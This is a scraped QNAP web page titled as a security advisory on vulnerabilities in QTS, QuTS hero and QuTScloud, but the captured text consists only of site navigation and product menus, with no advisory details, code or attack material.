=== Content from www.qnap.com_7b2cbc12_20250115_114146.html ===


* Global - English
* # [Multiple Vulnerabilities in QTS, QuTS hero and QuTScloud - Security Advisory | QNAP](https://www.qnap.com/en?ref=header_logo)
* [Join Community](https://community.qnap.com/c/en)
* [Sign in](/oauth/login?lang=en)
  ![Avatar]()

  ![Avatar](https://www.qnap.com/assets/img/header/member/qid.svg)

  QNAP ID
  + [![Software Store](https://www.qnap.com/assets/img/icon/header/license_store-new.png)
    Software Store](https://account.qnap.com/oauth/auth?lang=en&response_type=code&client_id=5d77080ed6b82f062b138be7&redirect_uri=https%3A%2F%2Fsoftware.qnap.com%2Freceive_auth&state=lang%3Den)
  + [![Warranty](https://www.qnap.com/assets/img/icon/header/warranty-new.png)
    Warranty](https://account.qnap.com/oauth/auth?lang=en&response_type=code&client_id=5b8e2d66d6b82f0a86def499&redirect_uri=https%3A%2F%2Fsoftware.qnap.com%2Fows%2Freceive_auth&state=lang%3Den)
  + [![Service Portal](https://www.qnap.com/assets/img/icon/header/customer_portal-new.png)
    Service Portal](https://account.qnap.com/oauth/auth?response_type=code&client_id=5d01a9afd6b82f288eb761d8&redirect_uri=https%3A%2F%2Fservice.qnap.com%2Foauth%2Fqcloud-back&state=en/home&lang=en)
  + [![Account Center](https://www.qnap.com/assets/img/icon/header/account_center-new.png)
    Account Center](https://account.qnap.com/?lang=en)
  [![Sign Out](https://www.qnap.com/assets/img/header/sign-out.svg)
  Sign out](/oauth/logout)

* ## Product
* ## Operating System
* ## Solution
* ## Support
* ## Where To Buy
* ## About Us

Close

## Product

* ### Storage

  + #### NAS- Network Attached Storage
  + #### Expansion Units
  + #### Cloud Storage

* ### Networking

  + #### High-speed Network Switches
  + #### SD-WAN Routers
  + #### Intel x86 Smart Edge Switch
  + #### NDR Cybersecurity Appliances
  + #### Network Virtualization uCPE
  + #### Accessories

* ### Expansion Accessories

  + #### Expansion Cards/ Interface Cards

* ### Surveillance & Smart Video

  + #### Video Surveillance System
  + #### Video Conferencing Appliance

## Operating System

* ### NAS OS

  + #### QTS
  + #### QuTS hero
  + #### QuTScloud
  + #### QES

* ### Networking OS

  + #### QNE Network
  + #### QSS
  + #### QuRouter

* ### Surveillance & Smart Video

  + #### QVR Surveillance
  + #### QVR Face
  + #### KoiMeeter

## Solution

## Support

## Where To Buy

## About Us

![Member](https://www.qnap.com/assets/img/header/globe-w.svg)
Global - English

[![Official Community](https://www.qnap.com/assets/img/header/community-w.svg)

Join Community](https://community.qnap.com/c/en)

![Avatar]()

* [Software Store](https://account.qnap.com/oauth/auth?lang=en&response_type=code&client_id=5d77080ed6b82f062b138be7&redirect_uri=https%3A%2F%2Fsoftware.qnap.com%2Freceive_auth&state=lang%3Den)
* [Warranty](https://account.qnap.com/oauth/auth?lang=en&response_type=code&client_id=5b8e2d66d6b82f0a86def499&redirect_uri=https%3A%2F%2Fsoftware.qnap.com%2Fows%2Freceive_auth&state=lang%3Den)
* [Service Portal](https://account.qnap.com/oauth/auth?response_type=code&client_id=5d01a9afd6b82f288eb761d8&redirect_uri=https%3A%2F%2Fservice.qnap.com%2Foauth%2Fqcloud-back&state=en/home&lang=en)
* [Account Center](https://account.qnap.com/?lang=en)

[![Member](https://www.qnap.com/assets/img/header/log-in.svg)
Sign in](/oauth/login?lang=en)

[![Member](https://www.qnap.com/assets/img/header/sign-out.svg)
Sign out](/oauth/logout)

NAS- Network Attached Storage

* ###### Tower NAS

  + [TS-h1277AFX
    NEW](/en/product/ts-h1277afx)
  + [TS-632X](/en/product/ts-632x)
  + [TS-432X](/en/product/ts-432x)
  + [TS-216G](/en/product/ts-216g)
  + [View All](https://www.qnap.com/en/product?feature=form_factor-tower%2Cform_factor-set_top_design)
* ###### Short Depth Rackmount NAS

  + [TS-h765eU
    NEW](/en/product/ts-h765eu)
  + [TS-433eU
    NEW](/en/product/ts-433eu)
  + [TS-855eU](/en/product/ts-855eu)
  + [TS-855eU-RP](/en/product/ts-855eu-rp)
  + [View All](https://www.qnap.com/en/product?feature=form_factor-short_depth_rackmount)
* ###### Rackmount NAS

  + [TS-h3077AFU](/en/product/ts-h3077afu)
  + [TS-h1277AXU-RP](/en/product/ts-h1277axu-rp)
  + [TS-h1677AXU-RP](/en/product/ts-h1677axu-rp)
  + [TS-h3087XU-RP](/en/product/ts-h3087xu-rp)
  + [View All](https://www.qnap.com/en/product?feature=form_factor-rackmount)
* ###### All-Flash NAS

  + [TS-h1277AFX
    NEW](/en/product/ts-h1277afx)
  + [TS-h3077AFU](/en/product/ts-h3077afu)
  + [TBS-h574TX](/en/product/tbs-h574tx)
  + [TS-410E](/en/product/ts-410e)
  + [View All](https://www.qnap.com/en/product?feature=feature-all_flash)
* ###### 2.5GbE NAS + Switch Bundle Pack

  + [TS-473A-SW5T](/go/campaign/ts-473a-with-qsw-1105-5t)
  + [TS-673A-SW5T](/go/campaign/ts-673a-with-qsw-1105-5t)
  + [TS-873A-SW5T](/go/campaign/ts-873a-with-qsw-1105-5t)
* ###### Storage Accessories

  + [QXG-ES10G1T
    NEW](/en/product/qxg-es10g1t)
  + [QNA-UC10G1SF
    NEW](/en/product/qna-uc10g1sf)
  + [QNA-UC10G1T
    NEW](/en/product/qna-uc10g1t)
  + [QXP-3X8PES](/en/product/qxp-3x8pes)
  + [View All](https://www.qnap.com/en/product/compare-accessory)
* ###### Resources

  + [Product Comparison](/go/product/)
  + [Guideline for Choosing and Upgrading NAS](/go/solution/nas-choose-and-upgrade/)
  + [NAS Selector](/go/selector/nas-selector)
  + [RAID Calculator](/go/selector/raid-selector)
  + [Compatibility for NAS Migration](/go/nas-migration/)
  + [NAS Performance](/go/product_x_performance/)
  + [QNAP Blog](https://blog.qnap.com/)
  + [Virtualization Certification](/go/solution/virtualization/#vt-5f)
  + [Customer Stories](/go/case-studies/)
  + [Online Demo](/go/live-demo)
  + [App Center](/go/app_center)
  + [White Papers](/go/white-paper)
  + [Rail Kit](/go/product/rail-kit)

Expansion Units

* ###### Expand NAS Capacity

  + [TL-R1200PES-RP](/en/product/tl-r1200pes-rp)
  + [TL-R1600PES-RP](/en/product/tl-r1600pes-rp)
  + [TL-R2400PES-RP](/en/product/tl-r2400pes-rp)
  + [TL-R1220Sep-RP](/en/product/tl-r1220sep-rp)
  + [View All](https://www.qnap.com/en/product/compare-expansion?feature=support_os-qts)
* ###### Expand PC/Server Capacity

  + [TL-R1620Sdc](/en/product/tl-r1620sdc)
  + [TL-R1220Sep-RP](/en/product/tl-r1220sep-rp)
  + [TL-R1620Sep-RP](/en/product/tl-r1620sep-rp)
  + [TL-D400S](/en/product/tl-d400s)
  + [View All](https://www.qnap.com/en/product/compare-expansion?feature=support_os-windows)
* ###### Resources

  + [Storage Expansion Card](/go/product/compare-accessory?tab=expansion_units)
  + [NAS Compatibility](/go/compatibility-expansion)
  + [Drive Compatibility](/go/compatibility/)
  + [Choose Ideal External Drive RAID Storage for Your Mac/PC](/go/solution/external-drive-raid-storage/)

Cloud Storage

* ###### QNAP Cloud

  + [myQNAPcloud Storage for NAS Backup](/go/solution/myqnapcloud-storage/)
  + [myQNAPcloud Storage as Cloud Drive](/go/solution/myqnapcloud-storage-portal/)
* ###### Cloud NAS

  + [QuTScloud for Public Cloud](/go/solution/qutscloud/)
  + [QuTScloud for Private Cloud](/go/solution/qutscloud-hypervisor/)
* ###### Cloud Applications

  + [Backup to Cloud](/go/software/hybrid-backup-sync/)
  + [HybridMount](/go/solution/hybridmount/)
  + [VJBOD Cloud](/go/solution/vjbod-cloud/)
  + [QuObjects](/go/software/quobjects)
  + [AMIZcloud Central Management Platform](/go/software/amiz-cloud)

DAS & Accessories

* ###### Direct Attached Storage (PC/Workstations)

  + [TL-R1620Sdc](/en/product/tl-r1620sdc)
  + [TL-R1620Sep-RP](/en/product/tl-r1620sep-rp)
  + [TL-R1220Sep-RP](/en/product/tl-r1220sep-rp)
  + [TL-D1600S](/en/product/tl-d1600s)
  + [View All](https://www.qnap.com/en/product/series/pc-expansion)
* ###### Accessories

  + [QNA-UC10G1SF
    NEW](/en/product/qna-uc10g1sf)
  + [QNA-UC10G1T
    NEW](/en/product/qna-uc10g1t)
  + [QM2-2P-384A](/en/product/qm2-2p-384a)
  + [QM2-2P-344A](/en/product/qm2-2p-344a)
  + [View All](https://www.qnap.com/en/product/series/for-pc-workstations)
* ###### Resources

  + [Choose Ideal External Drive RAID Storage for Your Mac/PC](/go/solution/external-drive-raid-storage/)

High-speed Network Switches

* ###### QSW 2.5GbE Switches

  + [QSW-M2106PR-2S2T](/en/product/qsw-m2106pr-2s2t)
  + [QSW-M2106-4C](/en/product/qsw-m2106-4c)
  + [QSW-M2106-4S](/en/product/qsw-m2106-4s)
  + [QSW-M2106R-2S2T](/en/product/qsw-m2106r-2s2t)
  + [View All](https://www.qnap.com/en/product/series/qsw-2-5gbe-switches)
* ###### QSW 10GbE Switches

  + [QSW-IM3216-8S8T
    NEW](/en/product/qsw-im3216-8s8t)
  + [QSW-M3224-24T](/en/product/qsw-m3224-24t)
  + [QSW-M3216R-8S8T](/en/product/qsw-m3216r-8s8t)
  + [QSW-3216R-8S8T](/en/product/qsw-3216r-8s8t)
  + [View All](https://www.qnap.com/en/product/series/qsw-10gbe-switches)
* ###### QSW Full 10GbE Switches

  + [QSW-IM3216-8S8T
    NEW](/en/product/qsw-im3216-8s8t)
  + [QSW-M3224-24T](/en/product/qsw-m3224-24t)
  + [QSW-3216R-8S8T](/en/product/qsw-3216r-8s8t)
  + [QSW-M3216R-8S8T](/en/product/qsw-m3216r-8s8t)
  + [View All](https://www.qnap.com/en/product/series/qsw-full-10gbe-switches)
* ###### PoE Switches

  + [QSW-M2106PR-2S2T](/en/product/qsw-m2106pr-2s2t)
  + [QGD-1602P](/en/product/qgd-1602p)
  + [QGD-1600P](/en/product/qgd-1600p)
  + [QSW-M2116P-2T2S](/en/product/qsw-m2116p-2t2s)
  + [View All](https://www.qnap.com/en/product/series/poe-switches)
* ###### QSW Managed Switches

  + [QSW-IM3216-8S8T
    NEW](/en/product/qsw-im3216-8s8t)
  + [QSW-M3224-24T](/en/product/qsw-m3224-24t)
  + [QSW-M3216R-8S8T](/en/product/qsw-m3216r-8s8t)
  + [QSW-M3212R-8S4T](/en/product/qsw-m3212r-8s4t)
  + [View All](https://www.qnap.com/en/product/series/qsw-managed-switches)
* ###### QSW Unmanaged Switches

  + [QSW-3216R-8S8T](/en/product/qsw-3216r-8s8t)
  + [QSW-1108-8T](/en/product/qsw-1108-8t)
  + [QSW-2104-2T](/en/product/qsw-2104-2t)
  + [QSW-2104-2S](/en/product/qsw-2104-2s)
  + [View All](https://www.qnap.com/en/product/series/qsw-unmanaged-switches)
* ###### QSW Industrial-grade Switches

  + [QSW-IM3216-8S8T
    NEW](/en/product/qsw-im3216-8s8t)
  + [View All](https://www.qnap.com/en/product/series/qsw-industrial-switches)
* ###### QSW 25GbE Switches

  + [QSW-M5216-1T](/en/product/qsw-m5216-1t)
  + [View All](https://www.qnap.com/en/product/series/qsw-25gbe-switches)
* ###### QSW 100GbE Switches

  + [QSW-M7308R-4X](/go/product/qsw-m7308r-4x)
* ###### QGD Smart Edge Switches

  + [QGD-1602](/en/product/qgd-1602)
  + [QGD-1600](/en/product/qgd-1600)
  + [QGD-1602P](/en/product/qgd-1602p)
  + [QGD-1600P](/en/product/qgd-1600p)
  + [View All](https://www.qnap.com/en/product/series/qgd-switches)
* ###### Resources

  + [Product Comparison](/go/product/compare-switches)

SD-WAN Routers

* ###### SD-WAN Router

  + [QMiroPlus-201W](/en/product/qmiroplus-201w)
  + [QMiro-201W](/en/product/qmiro-201w)
  + [Product Comparison](/en/product/compare-routers)
  + [View All](https://www.qnap.com/en/product/series/mesh-wi-fi-routers)
* ###### Wi-Fi 6 SD-WAN Router

  + [QHora-301W](/go/product/qhora-301w)
  + [View All](https://www.qnap.com/en/product/series/qhora-router)
* ###### Wired SD-WAN Router

  + [QHora-321](/go/product/qhora-321)
  + [QHora-322](/go/product/qhora-322)
  + [Product Comparison](/go/product/compare-routers)
  + [View All](https://www.qnap.com/en/product/series/qhora-router)
* ###### Resources

  + [Mobile app](/go/mobile-apps?category=networking)
  + [Utilities](/go/utilities/networking)
  + [Compatibility List](/go/compatibility/)

Intel x86 Smart Edge Switch

* ###### Intel x86 Smart Edge Switch

  + [QGD-1602](/go/product/qgd-1602/)
  + [QGD-1600](/go/product/qgd-1600/)
  + [QGD-1602P](/go/product/qgd-1602p/)
  + [QGD-1600P](/go/product/qgd-1600p/)
  + [QGD-3014-16PT](/go/product/qgd-3014-16pt/)
  + [Product Comparison](/go/product/compare-switches?conditions=features-0)
* ###### Smart Edge Switch Series

  + [Guardian Smart Edge Switches](/go/solution/guardian/)

NDR Cybersecurity Appliances

* ###### ADRA NDR Cybersecurity Appliances

  + [QGD-1600](/go/product/qgd-1600/adra-ndr)
  + [QGD-1602](/go/product/qgd-1602/adra-ndr)
  + [QGD-1602P](/go/product/qgd-1602p/adra-ndr)
  + [QGD-1600P](/go/product/qgd-1600p/adra-ndr)
  + [View All](https://www.qnap.com/en/product/series/adra-ndr)
* ###### NDR Cybersecurity Appliance Series

  + [Guardian NDR Cybersecurity Appliance](/go/solution/guardian/)

Network Virtualization uCPE

* ###### QuCPE Network Virtualization Premise Equipment

  + [QuCPE-3032](/en/product/qucpe-3032)
  + [QuCPE-3034](/en/product/qucpe-3034)
  + [QuCPE-7012](/en/product/qucpe-7012)
  + [View All](https://www.qnap.com/en/product/series/qucpe)
* ###### Virtualized IT Room Solutions

  + [Software-defined Platform Total Solution](/go/solution/qne-software-defined-platform)
  + [AMIZcloud Management Platform](/go/software/amiz-cloud?platform=vnf-management)
* ###### More Apps

  + [QNE Application Store](/go/application-store/qne)

Accessories

* ###### Add network ports

  + [QXG-ES10G1T
    NEW](/en/product/qxg-es10g1t)
  + [QNA-UC10G1T
    NEW](/en/product/qna-uc10g1t)
  + [QNA-UC10G1SF
    NEW](/en/product/qna-uc10g1sf)
  + [QXG-10G2SF-X710](/en/product/qxg-10g2sf-x710)
  + [View All](https://www.qnap.com/en/product/compare-accessory?tab=network)
* ###### Add Wi-Fi connectivity

  + [QWA-AC2600](/en/product/qwa-ac2600)
  + [View All](https://www.qnap.com/en/product/compare-accessory?tab=wifi)
* ###### Wake on Lan Device

  + [QWU-100](/go/product/qwu-100)
* ###### Resources

  + [Choose Accessories](/go/product/compare-accessory)

Expansion Cards/ Interface Cards

* ###### Connect storage expansion units

  + [QXP-3X4PES](/en/product/qxp-3x4pes)
  + [QXP-3X8PES](/en/product/qxp-3x8pes)
  + [QXP-1600eS-A1164](/en/product/qxp-1600es-a1164)
  + [QXP-T32P](/en/product/qxp-t32p)
  + [View All](https://www.qnap.com/en/product/compare-accessory?tab=expansion_units)
* ###### Expand my storage

  + [QM2-2P-384A](/en/product/qm2-2p-384a)
  + [QM2-2P-344A](/en/product/qm2-2p-344a)
  + [QM2-2P410G1T](/en/product/qm2-2p410g1t)
  + [QM2-2P410G2T](/en/product/qm2-2p410g2t)
  + [View All](https://www.qnap.com/en/product/compare-accessory?tab=storage)
* ###### Add network ports

  + [QXG-ES10G1T
    NEW](/en/product/qxg-es10g1t)
  + [QNA-UC10G1T
    NEW](/en/product/qna-uc10g1t)
  + [QNA-UC10G1SF
    NEW](/en/product/qna-uc10g1sf)
  + [QXG-10G2SF-X710](/en/product/qxg-10g2sf-x710)
  + [View All](https://www.qnap.com/en/product/compare-accessory?tab=network)
* ###### Add Wi-Fi connectivity

  + [QWA-AC2600](/en/product/qwa-ac2600)
  + [View All](https://www.qnap.com/en/product/compare-accessory?tab=wifi)
* ###### Customize drive usage

  + [QDA-UMP4](/en/product/qda-ump4)
  + [QDA-SA3](/en/product/qda-sa3)
  + [QDA-U2MP](/en/product/qda-u2mp)
  + [QDA-A2AR](/en/product/qda-a2ar)
  + [View All](https://www.qnap.com/en/product/compare-accessory?tab=customizedrive)
* ###### Resources

  + [Choose Accessories](/go/product/compare-accessory)

Video Surveillance System

* ###### QVR Pro Appliances

  + [QVP-21C](/en/product/qvp-21c)
  + [QVP-41C](/en/product/qvp-41c)
  + [QVP-63B](/en/product/qvp-63b)
  + [QVP-85B](/en/product/qvp-85b)
  + [Product Comparison](/en/product/compare-qvr-pro-appliance)
  + [View All](https://www.qnap.com/en/product/series/qvr-pro-appliance)
* ###### Smart Video Surveillance System

  + [QVR Surveillance Solution](/go/solution/qvr-surveillance/)
  + [QVR Pro Client Software](/go/software/qvr-pro-client)
* ###### Resources

  + [Surveillance NAS Selector](/go/qvr-nas-selector/)
  + [QVR Elite Camera Compatibility List](/go/compatibility-camera/)
  + [QVR Pro Camera Compatibility List](/go/compatibility-qvr-pro/)
  + [Solution Brief: How Surveillance NAS can become the best enterprise surveillance solution](/go/solution-brief/how-surveillance-nas-can-become-the-best-enterprise-surveillance-solution)

Video Conferencing Appliance

* ###### Smart Video Products

  + [KoiBox](/go/product/koibox-100w)
  + [KoiMeeter](/go/solution/KoiMeeter/)

QTS

#### QTS

QTS is the operating system for entry- and mid-level QNAP NAS. WIth Linux and ext4, QTS enables reliable storage for everyone with versatile value-added features and apps, such as snapshots, Plex media servers, and easy access of your personal cloud.

##### System

* [QTS Overview](/go/operating-system/qts)
* [QTS 5.2 New Features](/go/qts/5.2.0/)
* [Storage & Snapshots](/go/solution/storage-management/)
* [Network & Virtual Switch](/go/software/network-virtual-switch)
* [Notification Center](/go/solution/notification-center/)
* [App Center](/go/app_center/)
* [myQNAPcloud](/go/software/myqnapcloud/)
* [Qfinder Pro](/go/software/qfinder-pro)
* [Desktop Utilities](/go/utilities)
* [Mobile Apps](/go/mobile-apps)
* [Online Demo](/go/live-demo)

##### Applications

* ###### Backup and Data Protection

  + [Boxafe](/go/software/boxafe)
  + [Hybrid Backup Sync](/go/software/hybrid-backup-sync)
  + [Hyper Data Protector](/go/software/hyper-data-protector)
  + [Multi-Application Recovery Service](/go/solution/backup-and-restoration/?platform=wordpress)
  + [Qsync](/go/software/qsync)
  + [Snapshot](/go/solution/snapshots/)
* ###### Virtualization

  + [Container Station](/go/solution/container_station)
  + [QuWAN vRouter](/go/solution/quwan-sd-wan/)
  + [Storage for Virtualization](/go/solution/storage-for-virtualization/)
  + [Linux Station](/go/solution/linux-station-app/)
  + [Virtualization Station](/go/software/virtualization-station)
* ###### Storage Management

  + [Storage & Snapshots](/go/solution/storage-management/)
  + [DA Drive Analyzer](/go/software/da-drive-analyzer)
  + [Qtier](/go/solution/qtier)
  + [SSD Cache](/go/solution/ssd-cache)
  + [SSD Over-provisioning](/go/solution/ssd-extra-overprovisioning)
* ###### Productivity

  + [Browser Station](/go/solution/browser-station/)
  + [File Station](/go/solution/file-station)
  + [IFTTT Agent](/go/solution/ifttt_agent)
  + [KoiMeeter](/go/software/koimeeter)
  + [Mattermost](/go/solution/instant-messaging)
  + [Notes Station](/go/solution/notes-station3)
  + [QcalAgent](/go/solution/qcalagent/)
  + [Qfiling](/go/software/qfiling)
  + [QmailAgent](/go/solution/qmailagent/)
  + [Qmiix](/go/software/qmiix)
  + [Qsirch](/go/software/qsirch)
  + [Qsirch PC Edition](/go/software/qsirch-pc-edition)
  + [QuFTP](/go/software/quftp)
  + [WirelessAP Station](/go/solution/wirelessap-station/)
  + [WorldCard Team](/go/software/worldcard-team)
* ###### IT Management

  + [AMIZcloud](/go/software/amiz-cloud)
  + [Organization Center](/go/software/organization-center)
  + [Notification Center](/go/solution/notification-center)
  + [Q’center](/go/solution/qcenter)
  + [SNMP](/go/solution/snmp/)
  + [TeamViewer](/go/solution/teamviewer/)
* ###### Multimedia

  + [HybridDesk Station](/go/software/hybriddesk-station)
  + [Multimedia Console](/go/software/multimedia-console)
  + [Photo Station](/go/software/photo-station)
  + [QuMagie](/go/software/qumagie)
  + [Music Station](/go/software/music-station)
  + [Video Station](/go/software/video-station)
  + [Plex Media Server](/go/solution/plex-best-nas/)
  + [Roon Music Server](/go/solution/roon)
  + [CAYIN MediaSign Player](/go/software/cayin-mediasign-player)
* ###### Cloud

  + [HybridMount](/go/software/hybridmount)
  + [Qmiix](/go/software/qmiix)
  + [QuTScloud](/go/solution/qutscloud-overview)
  + [QuObjects](/go/software/quobjects)
  + [VJBOD Cloud](/go/software/vjbod-cloud)
* ###### Surveillance & Smart Video

  + [QVR Pro](/go/software/qvr-pro)
  + [QVR Elite](/go/software/qvr-elite)
  + [QVR Smart Search](/go/software/qvr-smart-search)
  + [QVR Face](/go/solution/qvr-face)
  + [QVR DoorAccess](/go/software/qvr-dooraccess)
  + [QVR Human](/go/software/qvr-human)
  + [QVR Guard](/go/software/qvr-guard)
  + [QVR Center](/go/software/qvr-center)
  + [KoiMeeter](/go/software/koimeeter)
* ###### Security

  + [pfSense](/go/solution/pfsense/)
  + [QuFirewall](/go/software/qufirewall)
  + [QVPN](/go/software/qvpn-service)
  + [Malware Remover](/go/software/malware-remover)
  + [QNAP Authenticator](/go/solution/authentication/%20)
* ###### Utilities and Mobile

  + [Client Utilities](/go/utilities)
  + [Mobile Apps](/go/mobile-apps)

QuTS hero

#### QuTS hero

QuTS hero is the operating system for high-end and enterprise QNAP NAS models. With Linux and ZFS, QuTS hero supports advanced data reduction technologies for further driving down costs and increasing reliablility of SSD (all-flash) storage.

##### System

* [QuTS hero Overview](/go/operating-system/quts-hero)
* [h5.2 New Features](/go/operating-system/quts-hero/5.2.0)
* [Storage & Snapshots](/go/solution/storage-management)
* [Backup & Restore](/go/solution/backup-and-restoration)
* [Real-time SnapSync Disaster Recovery](/go/solution/zfs-snapsync/)
* [Network & Virtual Switch](/go/software/network-virtual-switch)
* [Notification Center](/go/solution/notification-center/)
* [App Center](/go/app_center/?os=quts_hero&version=h4.5.1~h4.5.2)
* [myQNAPcloud](/go/software/myqnapcloud/)
* [Desktop Utilities](/go/utilities)
* [Mobile Apps](/go/mobile-apps)

##### Applications

* ###### Backup and Data Protection

  + [Boxafe](/go/software/boxafe)
  + [Hybrid Backup Sync](/go/software/hybrid-backup-sync)
  + [Hyper Data Protector](/go/software/hyper-data-protector)
  + [Multi-Application Recovery Service](/go/solution/backup-and-restoration/?platform=wordpress)
  + [Qsync](/go/software/qsync)
  + [Snapshot](/go/solution/snapshots/)
* ###### Virtualization

  + [Container Station](/go/solution/container_station)
  + [QuWAN vRouter](/go/solution/quwan-sd-wan/)
  + [Storage for Virtualization](/go/solution/storage-for-virtualization/)
  + [Linux Station](/go/solution/linux-station-app/)
  + [Virtualization Station](/go/software/virtualization-station)
* ###### Storage Management

  + [Storage & Snapshots](/go/solution/storage-management)
  + [DA Drive Analyzer](/go/software/da-drive-analyzer)
  + [SSD Cache](/go/solution/ssd-cache)
  + [QuTS hero Snapshots](/go/solution/snapshots-protection-quts-hero/)
* ###### Productivity

  + [Browser Station](/go/solution/browser-station/)
  + [File Station](/go/solution/file-station)
  + [IFTTT Agent](/go/solution/ifttt_agent)
  + [KoiMeeter](/go/software/koimeeter)
  + [Mattermost](/go/solution/instant-messaging)
  + [Notes Station](/go/solution/notes-station3)
  + [Qfiling](/go/software/qfiling)
  + [QmailAgent](/go/software/qmailagent)
  + [Qmiix](/go/software/qmiix)
  + [Qsirch](/go/software/qsirch)
  + [Qsirch PC Edition](/go/software/qsirch-pc-edition)
* ###### IT Management

  + [AMIZcloud](/go/software/amiz-cloud)
  + [Organization Center](/go/software/organization-center)
  + [Notification Center](/go/solution/notification-center)
  + [Q’center](/go/solution/qcenter)
  + [SNMP](/go/solution/snmp/)
* ###### Cloud

  + [QuTScloud](/go/solution/qutscloud-overview)
  + [HybridMount](/go/software/hybridmount)
  + [VJBOD Cloud](/go/software/vjbod-cloud)
  + [QuObjects](/go/software/quobjects)
  + [Qmiix](/go/software/qmiix)
* ###### Surveillance & Smart Video

  + [QVR Pro](/go/software/qvr-pro)
  + [QVR Elite](/go/software/qvr-elite)
  + [QVR Smart Search](/go/software/qvr-smart-search)
  + [QVR Face](/go/solution/qvr-face)
  + [QVR DoorAccess](/go/software/qvr-dooraccess)
  + [QVR Human](/go/software/qvr-human)
  + [QVR Guard](/go/software/qvr-guard)
  + [QVR Center](/go/software/qvr-center)
  + [KoiMeeter](/go/software/koimeeter)
* ###### Security

  + [pfSense](/go/solution/pfsense/)
  + [QuFirewall](/go/software/qufirewall)
  + [QVPN](/go/software/qvpn-service)
  + [Malware Remover](/go/software/malware-remover)
  + [QNAP Authenticator](/go/solution/authentication/%20)
* ###### Utilities and Mobile

  + [Client Utilities](/go/utilities)
  + [Mobile Apps](/go/mobile-apps)

QuTScloud

#### QuTScloud

QuTScloud is the operating system for QNAP Cloud NAS virtual appliances. With the possibility of on-premises and cloud deployment, QuTScloud enables optimized cloud data usage and flexible resource allocation at a predictable monthly cost.

##### System

* [QuTScloud Overview](/go/solution/qutscloud-overview/)
* [QuTScloud for Public Cloud](/go/solution/qutscloud/)
* [QuTScloud for On-Premises Hypervisors](/go/solution/qutscloud-hypervisor/)
* [Online Demo](/go/live-demo/)

##### Applications

* ###### Backup and Data Protection

  + [Boxafe](/go/software/boxafe)
  + [Hybrid Backup Sync](/go/software/hybrid-backup-sync)
  + [VJBOD Cloud](/go/software/vjbod-cloud)
  + [Qsync](/go/software/qsync)
* ###### Virtualization

  + [Container Station](/go/solution/container_station)
* ###### Storage Management

  + [Overview](/go/solution/storage-management/)
* ###### Productivity

  + [Browser Station](/go/solution/browser-station/)
  + [File Station](/go/solution/file-station)
  + [Mattermost](/go/solution/instant-messaging)
  + [Notes Station](/go/solution/notes-station3)
  + [QcalAgent](/go/solution/qcalagent/)
  + [Qfiling](/go/software/qfiling)
  + [QmailAgent](/go/solution/qmailagent/)
  + [Qmiix](/go/software/qmiix)
  + [Qsirch](/go/software/qsirch)
  + [Qsirch PC Edition](/go/software/qsirch-pc-edition)
* ###### IT Management

  + [Notification Center](/go/solution/notification-center)
  + [Q’center](/go/solution/qcenter)
* ###### Multimedia

  + [Multimedia Console](/go/software/multimedia-console)
  + [Plex Media Server](/go/solution/plex-best-nas/)
  + [QuMagie](/go/software/qumagie)

QES

#### QES

QES is the operating system for dual-controller QNAP NAS models. With FreeBSD and ZFS, QES is flash-optimized, capable of driving outstanding performance for all-flash storage arrays.

##### System

* [QES Overview](/go/qes/2.2/)
* [Real-time SnapSync Disaster Recovery](/go/solution/zfs-snapsync/)

##### Product

* [ES1686dc](/go/product/es1686dc)
* [ES2486dc](/go/product/es2486dc)

##### Resources

* [ZFS Advantages](/go/solution/qnap-zfs/)
* [RAID Calculator](https://enterprise-nas.qnap.com/en/calculator/)

QNE Network

#### QNE Network

QNE Network is the operating system for QuCPE, QNAP's universal customer premises equipment series. Run virtual network functions, freely configure software-defined networks, and enjoy benefits such as lowered costs and reduced management efforts.

##### System

* [QNE Network Overview](/go/solution/qne-software-defined-platform)
* [QuWAN](/go/solution/quwan-sd-wan)
* [Network Manager](/go/software/network-manager)
* [Service Composer](/go/solution/service-composer/)
* [AMIZcloud](/go/software/amiz-cloud?platform=vnf-management)
* [Security Center](/go/software/security-center)

##### Applications

* ###### Security

  + [pfSense](/go/solution/pfsense/)
  + [QuFirewall](/go/software/qufirewall)
  + [QVPN](/go/software/qvpn-service)
* ###### Cloud

  + [AMIZcloud](/go/software/amiz-cloud?platform=vnf-management)
* ###### IT Management

  + [HybridMount](/go/software/hybridmount)
* ###### SD-WAN

  + [QuWAN](/go/solution/quwan-sd-wan)
  + [QuWAN Orchestrator](https://quwan.qnap.com/)
* ###### Mobile Apps

  + [Mobile Apps](/go/mobile-apps)

QSS

#### QSS

QNAP Switch System (QSS) is the configuration interface for QNAP's managed switch series. Enable management functions such as link aggregation, VLAN, and RSTP, to take care of your network topology with ease.

##### System

* [QSS Overview](/go/solution/qnap-switch-system)

QuRouter

#### QuRouter

QNAP’s QuRouter OS simplifies managing high-speed and high-coverage LAN/WAN. With NAT, VPN, security, and QuWAN SD-WAN, network management is made easier and remote connections more secure.

##### System

* [QuRouter Overview](/go/solution/qnap-router-system)
* [QuWAN](/go/solution/quwan-sd-wan)

##### Applications

* ###### Security

  + [QVPN](/go/software/qvpn-service)
* ###### SD-WAN

  + [QuWAN](/go/solution/quwan-sd-wan)
  + [QuWAN Orchestrator](https://quwan.qnap.com/)
* ###### Mobile Apps

  + [Mobile Apps](/go/mobile-apps)

QVR Surveillance

#### QVR Surveillance

QVR Surveillance is QNAP’s network video recorder software solution. It offers subscription-based QVR Elite and perpetual QVR Pro, and can be used with a series of apps, such as face recognition and door access control for a wider range of scenarios.

##### System

* [QVR Surveillance Solution](/go/solution/qvr-surveillance/)
* [QVR Pro Client](/go/software/qvr-pro-client)
* [QVR Pro](/go/software/qvr-pro)
* [QVR Elite](/go/software/qvr-elite)

##### Applications

* [QVR Smart Search](/go/software/qvr-smart-search)
* [QVR Face](/go/solution/qvr-face/)
* [QVR DoorAccess](/go/software/qvr-dooraccess)
* [QVR Human](/go/software/qvr-human)
* [QVR Guard](/go/software/qvr-guard)
* [QVR Center](/go/software/qvr-center)

##### Resources

* [Surveillance NAS Selector](/go/qvr-nas-selector/)
* [QVR Pro Camera Compatibility List](/go/compatibility-qvr-pro)
* [QVR Elite Camera Compatibility List](/go/compatibility-camera/)
* [QVR NVR Developer Portal](/go/solution/qvr-developer/)

QVR Face

#### QVR Face

QVR Face is a smart facial recognition solution featuring real-time live streaming video analytics from connected cameras. It can be integrated into multiple scenarios to provide intelligent attendance management, door access control management, VIP welcome systems and smart retail services.

##### System

* [QVR Face](/go/solution/qvr-face/)

##### Applications

* [QVR DoorAccess](/go/software/qvr-dooraccess)

##### Resources

* [QVR Face & NAS/NVR Selector](/go/qvr-face-selector/)
